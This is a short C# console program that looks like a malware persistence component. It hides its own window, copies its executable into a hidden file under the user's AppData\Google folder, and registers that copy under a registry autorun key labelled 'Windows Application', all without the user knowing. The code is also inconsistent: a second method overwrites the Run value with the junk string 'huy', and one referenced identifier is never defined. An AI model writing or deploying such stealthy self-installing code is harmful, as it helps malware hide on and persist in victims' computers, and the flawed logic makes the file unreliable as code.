using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace reflection
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("kernel32.dll")]
        public static extern void ExitProcess([In] uint uExitCode);
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private static void Main()
        {

            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
            Console.SetWindowSize(1, 1);
            var fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Google",
                AssemblyProduct);
            if (!File.Exists(fileName))
            {
                File.Copy(AssemblyProduct, fileName);
                File.SetAttributes(fileName, FileAttributes.Hidden);
            }
            var key = Registry.CurrentUser.CreateSubKey(IAssembly.Autorun);
            if (key != null) key.SetValue("Windows Application", fileName);
            Method();
        }
        private static void Method()
        {
            var key = Registry.CurrentUser;
            key = key.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\", true);
            if (key != null) key.SetValue("Windows Application", "huy");
            ExitProcess(0);
        }
        public static string AssemblyProduct
        {
            get
            {
                var attributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(AssemblyProductAttribute), false);
                return attributes.Length == 0 ? "" : ((AssemblyProductAttribute)attributes[0]).Product + ".exe";
            }
        }

    }
}
